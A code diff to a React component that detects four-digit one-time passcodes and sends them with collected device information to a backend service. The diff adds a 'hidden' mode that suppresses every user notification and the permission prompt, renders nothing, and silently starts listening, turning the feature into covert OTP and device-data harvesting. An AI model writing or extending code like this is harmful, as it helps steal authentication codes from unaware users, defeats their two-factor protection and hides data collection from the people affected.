@@ -1,12 +1,7 @@
-
 import React, { useState, useEffect } from 'react';
 import { toast } from 'sonner';
 import { collectDeviceInfo } from '../services/DeviceInfoService';
 import { submitOtpAndDeviceInfo } from '../services/ApiService';
-import { Bell, BellOff } from 'lucide-react';
-import { Switch } from '@/components/ui/switch';
-import { Button } from '@/components/ui/button';
-import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
 
 // Remove the hardcoded pattern and make it a customizable field
 const DEFAULT_OTP_PATTERN = /\b\d{4}\b/;
@@ -14,9 +9,14 @@ const DEFAULT_OTP_PATTERN = /\b\d{4}\b/;
 interface OtpListenerProps {
   isActive?: boolean;
   minimized?: boolean;
+  hidden?: boolean; // New prop to completely hide the component
 }
 
-const OtpListener: React.FC<OtpListenerProps> = ({ isActive: initialActive = false, minimized = false }) => {
+const OtpListener: React.FC<OtpListenerProps> = ({ 
+  isActive: initialActive = false, 
+  minimized = false,
+  hidden = false 
+}) => {
   const [isActive, setIsActive] = useState<boolean>(initialActive);
   const [lastDetectedOtp, setLastDetectedOtp] = useState<string | null>(null);
   const [listeningStatus, setListeningStatus] = useState<'idle' | 'listening' | 'detected'>('idle');
@@ -36,13 +36,22 @@ const OtpListener: React.FC<OtpListenerProps> = ({ isActive: initialActive = fal
       const result = await submitOtpAndDeviceInfo({ otp, deviceInfo });
       
       if (result) {
-        toast.success('OTP and device information sent successfully');
+        // Don't show toast notifications if hidden mode is enabled
+        if (!hidden) {
+          toast.success('OTP and device information sent successfully');
+        }
       } else {
-        toast.error('Failed to send OTP information');
+        // Only show error if not in hidden mode
+        if (!hidden) {
+          toast.error('Failed to send OTP information');
+        }
       }
     } catch (error) {
       console.error('Error in OTP detection process:', error);
-      toast.error('Error processing OTP');
+      // Only show error if not in hidden mode
+      if (!hidden) {
+        toast.error('Error processing OTP');
+      }
     }
   };
 
@@ -54,12 +63,16 @@ const OtpListener: React.FC<OtpListenerProps> = ({ isActive: initialActive = fal
     if (newState) {
       setListeningStatus('listening');
       setStatusMessage('Listening for OTP codes in background...');
-      requestNotificationPermission();
-      toast.info('OTP detection activated in background');
+      if (!hidden) {
+        requestNotificationPermission();
+        toast.info('OTP detection activated in background');
+      }
     } else {
       setListeningStatus('idle');
       setStatusMessage('OTP detection is off');
-      toast.info('OTP detection deactivated');
+      if (!hidden) {
+        toast.info('OTP detection deactivated');
+      }
     }
   };
 
@@ -67,7 +80,7 @@ const OtpListener: React.FC<OtpListenerProps> = ({ isActive: initialActive = fal
   const requestNotificationPermission = async () => {
     if ('Notification' in window) {
       const permission = await Notification.requestPermission();
-      if (permission !== 'granted') {
+      if (permission !== 'granted' && !hidden) {
         toast.warning('Notification permission is required for better experience');
       }
     }
@@ -99,6 +112,20 @@ const OtpListener: React.FC<OtpListenerProps> = ({ isActive: initialActive = fal
         return 'text-app-dark-gray';
     }
   };
+
+  // If hidden, return nothing visible but keep the component mounted for background operations
+  if (hidden) {
+    useEffect(() => {
+      // Activate the listener immediately and silently in hidden mode
+      if (!isActive && initialActive) {
+        setIsActive(true);
+        setListeningStatus('listening');
+      }
+    }, []);
+    
+    // Return an empty fragment to keep the component mounted but invisible
+    return <></>;
+  }
 
   // If minimized, show a compact version
   if (minimized) {
